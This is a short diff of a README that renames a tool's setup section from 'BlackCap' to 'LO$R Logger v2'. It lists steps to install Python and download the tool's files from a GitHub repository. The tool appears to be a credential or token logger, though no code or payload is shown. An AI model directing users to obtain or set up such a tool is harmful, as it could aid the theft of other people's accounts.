@@ -18,7 +18,7 @@
 - [💼・Term](#terms)
 
 
-## <a id="setup"></a> 📁 〢 Setting up BlackCap
+## <a id="setup"></a> 📁 〢 Setting up LO$R Logger v2
 
 1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
 2. Install [LO$R Logger v2 Files](https://github.com/madhead341/LOSR-Logger-v2)
